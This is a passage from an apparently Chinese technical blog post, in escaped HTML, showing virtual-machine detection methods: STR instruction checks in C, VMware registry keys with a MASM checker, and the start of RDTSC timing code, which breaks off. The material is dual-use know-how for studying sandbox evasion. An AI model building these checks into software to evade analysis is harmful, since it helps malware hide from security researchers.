class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Native OS\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LDTDetect();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    GDTDetect();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图3所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/3.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                   图3&lt;br&gt;&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法四：基于STR的检测方法&quot;&gt;&lt;a href=&quot;#方法四：基于STR的检测方法&quot; class=&quot;headerlink&quot; title=&quot;方法四：基于STR的检测方法&quot;&gt;&lt;/a&gt;方法四：基于STR的检测方法&lt;/h3&gt;&lt;p&gt;在保护模式下运行的所有程序在切换任务时，对于当前任务中指向TSS的段选择器将会被存储在任务寄存器中，TSS中包含有当前任务的可执行环境状态，包括通用寄存器状态，段寄存器状态，标志寄存器状态，EIP寄存器状态等等，当此项任务再次被执行时，处理器就会其原先保存的任务状态。每项任务均有其自己的TSS，而我们可以通过STR指令来获取指向当前任务中TSS的段选择器。这里STR（Store task register）指令是用于将任务寄存器 (TR) 中的段选择器存储到目标操作数，目标操作数可以是通用寄存器或内存位置，使用此指令存储的段选择器指向当前正在运行的任务的任务状态段 (TSS)。在虚拟机和真实主机之中，通过STR读取的地址是不同的，当地址等于0x0040xxxx时，说明处于虚拟机中，否则为真实主机。实现代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; mem[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __asm str mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&quot; STR base: 0x&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%02x&quot;&lt;/span&gt;,mem[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( (mem[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]==&lt;span class=&quot;number&quot;&gt;0x00&lt;/span&gt;) &amp;amp;&amp;amp; (mem[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]==&lt;span class=&quot;number&quot;&gt;0x40&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\n INSIDE MATRIX!!\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\n Native OS!!\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图4所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                          图4&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法五：基于注册表检测虚拟机&quot;&gt;&lt;a href=&quot;#方法五：基于注册表检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法五：基于注册表检测虚拟机&quot;&gt;&lt;/a&gt;方法五：基于注册表检测虚拟机&lt;/h3&gt;&lt;p&gt;在windows虚拟机中常常安装有VMware Tools以及其它的虚拟硬件（如网络适配器、虚拟打印机，USB集线器……），它们都会创建任何程序都可以读取的windows注册表项，因此我们可以通过检测注册表中的一些关键字符来判断程序是否处于虚拟机之中。关于这些注册表的位置我们可以通过在注册表中搜索关键词“vmware”来获取，下面是我在VMware下的WinXP中找到的一些注册表项：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CLASSES_ROOT\Applications\VMwareHostOpen.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CLASSES_ROOT\Installer\Products\C2A6F2EFE6910124C940B2B12CF170FE\ProductName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值“VMware Tools”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CLASSES_ROOT\Installer\Products\C2A6F2EFE6910124C940B2B12CF170FE\SourceList\PackageName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Tools.msi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_CURRENT_USER\Printers\DeviceOld&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：_#VMwareVirtualPrinter,winspool,TPVM:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Virtual IDE Hard Drive&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：NECVMWar VMware IDE CDR10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Installer\Products\C2A6F2EFE6910124C940B2B12CF170FE\ProductName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\C2A6F2EFE6910124C940B2B12CF170FE\InstallProperties\DisplayName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reinstall\0002\DeviceDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware SVGA II&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards\2\Description&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Accelerated AMD PCNet Adapter&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E968-E325-11CE-BFC1-08002BE10318&amp;#125;\0000\DriverDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware SVGA II&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E968-E325-11CE-BFC1-&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;08002BE10318&amp;#125;\0000\ProviderName&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware, Inc.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E972-E325-11CE-BFC1-08002bE10318&amp;#125;\0001\DriverDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware Accelerated AMD PCNet Adapter&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&amp;#123;4D36E97B-E325-11CE-BFC1-08002BE10318&amp;#125;\0000\DriverDesc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;键值：VMware SCSI Controller&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项名：HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Print\Monitors\ThinPrint Print Port Monitor for VMWare&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;除以上这些表项之外，还有很多地方可以检测，特别是虚拟机提供的虚拟化软硬件、服务之类，比如文件共享服务，VMware 物理磁盘助手服务，VMware Ethernet Adapter Driver，VMware SCSI Controller等等的这些信息都可作为检测虚拟机的手段。这里我们就以其中某表项为例编程举例一下，其它表项检测方法同理，具体代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.386&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.model flat, stdcall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;option casemap:none&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  windows.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  user32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  kernel32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   include  advapi32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   includelib  user32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   includelib  kernel32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   includelib  advapi32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szCaption     db &amp;quot;VMware Detector &amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szInside         db &amp;quot;Inside VMware!&amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szOutside              db &amp;quot;Native OS!&amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szSubKey      db &amp;quot;software\VMWare, Inc.\VMware tools&amp;quot;,0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hKey              dd    ?&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szSubKey, 0,\&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 KEY_WRITE or KEY_READ, addr hKey&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .if eax == ERROR_SUCCESS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke MessageBox, NULL,addr szInside, addr szCaption, MB_OK&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .else&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke MessageBox, NULL,addr szOutside, addr szCaption, MB_OK&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  .endif&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke RegCloseKey,hKey&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  invoke ExitProcess,NULL&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;end start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图5所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;            图5&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法六：基于时间差的检测方式&quot;&gt;&lt;a href=&quot;#方法六：基于时间差的检测方式&quot; class=&quot;headerlink&quot; title=&quot;方法六：基于时间差的检测方式&quot;&gt;&lt;/a&gt;方法六：基于时间差的检测方式&lt;/h3&gt;&lt;p&gt;本方法通过运行一段特定代码，然后比较这段代码在虚拟机和真实主机之中的相对运行时间，以此来判断是否处于虚拟机之中。这段代码我们可以通过RDTSC指令来实现，RDTSC指令是用于将计算机启动以来的CPU运行周期数存放到EDX：EAX里面，其中EDX是高位，而EAX是低位。下面我们以xchg    ecx,  eax 一句指令的运行时间为例，这段指令在我的真实主机windows 7系统上的运行时间为0000001E，如图6所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/6.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;              图6&lt;br&gt;&lt;br&gt;&lt;/center&gt;

&lt;p&gt;而该指令在虚拟机WinXP下的运行时间为00000442，如图7所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;               图7&lt;br&gt;&lt;/center&gt;

&lt;p&gt;两者之间的运行时间明显差别很多，在虚拟机中的运行速度远不如真实主机的，一般情况下，当它的运行时间大于0xFF时，就可以确定它处于虚拟机之中了，因此不难写出检测程序，具体实现代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.586p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.model flat, stdcall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;option casemap:none&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;include     windows.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;include       kernel32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;include     user32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;includelib    kernel32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;includelib    user32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szTitle     db  &amp;quot;VMDetect With RDTSC&amp;quot;, 0h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szInsideVM    db  &amp;quot;Inside VMware!&amp;quot;, 0h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szOutsideVM   db  &amp;quot;Native OS!&amp;quot;, 0h&lt;/span&gt;&lt;br&gt;&lt;span 